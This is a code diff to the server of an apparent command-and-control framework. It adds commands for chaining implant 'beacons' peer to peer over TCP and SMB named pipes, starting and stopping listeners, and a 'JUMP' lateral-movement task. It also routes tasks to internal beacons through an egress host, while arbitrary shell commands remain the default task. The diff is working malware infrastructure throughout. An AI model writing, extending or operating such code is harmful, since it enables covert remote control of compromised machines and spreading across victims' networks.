@@ -135,6 +135,34 @@ def _build_task(session: Session, command: str, cmd_id: str,
             "path_b64": parts[1] if len(parts) > 1 else "",
             "code_b64": parts[2] if len(parts) > 2 else "",
         })
+    # ── P2P link commands ────────────────────────────────────────────────────
+    if command.startswith("P2P_LINK_TCP:"):
+        _addr = command[13:]
+        if ":" in _addr:
+            _host, _port = _addr.rsplit(":", 1)
+            return _bt("p2p_link_tcp", {"target": _host, "port": int(_port) if _port.isdigit() else 0})
+        return _bt("p2p_link_tcp", {"target": _addr, "port": 4444})
+    if command.startswith("P2P_LINK_SMB:"):
+        parts = command[13:].split(":", 1)
+        return _bt("p2p_link_smb", {"target": parts[0], "pipe_name": parts[1] if len(parts) > 1 else ""})
+    if command.startswith("P2P_UNLINK:"):
+        return _bt("p2p_unlink", {"guid": command[11:]})
+    if command == "P2P_STATUS":
+        return _bt("p2p_status", {})
+    if command.startswith("P2P_LISTENER_START_TCP:"):
+        return _bt("p2p_listener_start_tcp", {"address": command[22:]})
+    if command.startswith("P2P_LISTENER_STOP:"):
+        return _bt("p2p_listener_stop", {"address": command[18:]})
+    if command == "P2P_LISTENER_STOP_ALL":
+        return _bt("p2p_listener_stop", {"address": ""})
+    # ── Jump (lateral movement) ─────────────────────────────────────────────
+    if command.startswith("JUMP:"):
+        import json as _json
+        try:
+            params = _json.loads(command[5:])
+        except _json.JSONDecodeError:
+            params = {}
+        return _bt("jump", params)
     # Default: shell command with current CWD context
     return _bt("shell", {"cmd": command, "cwd": cwd})
 
@@ -338,20 +366,46 @@ class ServerSessionManager:
 
         _faf = command in ("EXIT", "KILL")
 
+        # ── P2P routing: if target is an internal beacon, route via egress ──
+        from server.p2p_routing import is_internal_beacon, find_chain_path, build_routed_task
+        send_session = session
+        _P2P_PARENT_CMDS = ("P2P_LINK_TCP:", "P2P_LINK_SMB:", "P2P_UNLINK:",
+                            "P2P_STATUS", "P2P_LISTENER_START_TCP:",
+                            "P2P_LISTENER_STOP:", "P2P_LISTENER_STOP_ALL")
+        _is_p2p_mgmt = any(command.startswith(p) if p.endswith(":") else command == p
+                           for p in _P2P_PARENT_CMDS)
+        if is_internal_beacon(self, session_id):
+            chain = find_chain_path(self, session_id)
+            if chain and len(chain) >= 2:
+                egress_id = chain[0]
+                egress = self._sm.get(egress_id)
+                if egress is not None:
+                    if _is_p2p_mgmt:
+                        send_session = egress
+                        # Map cmd_id to parent so output() knows who executed it
+                        self._cmd_session[cmd_id] = egress_id
+                        # Move pending from child to parent (parent executes the command)
+                        child_pending = self._pending.pop(session_id, None)
+                        if child_pending:
+                            self._pending[egress_id] = child_pending
+                    else:
+                        task_json = build_routed_task(self, task_json, chain, session_id)
+                        send_session = egress
+
         def _on_upload_failure(failed_cmd_id: str) -> None:
-            # Upload failed after PendingCommand was already registered — clear it
-            # so other operators are not blocked waiting for a response that won't come.
             try:
                 asyncio.run_coroutine_threadsafe(
                     self.clear_pending(session_id, failed_cmd_id), loop
                 )
             except RuntimeError:
-                pass  # loop already closed (server shutdown) — pending will TTL-expire
+                pass
 
+        _hist_sess = session if send_session is not session else None
         def _send():
-            send_async(session, task_json, display_str, cmd_id,
+            send_async(send_session, task_json, display_str, cmd_id,
                        operator=username, fire_and_forget=_faf,
-                       on_upload_failure=_on_upload_failure)
+                       on_upload_failure=_on_upload_failure,
+                       history_session=_hist_sess)
 
         # MED-21: hold the lock for the duration of the upload so two concurrent
         # send_command calls cannot interleave their cloud writes for the same session.
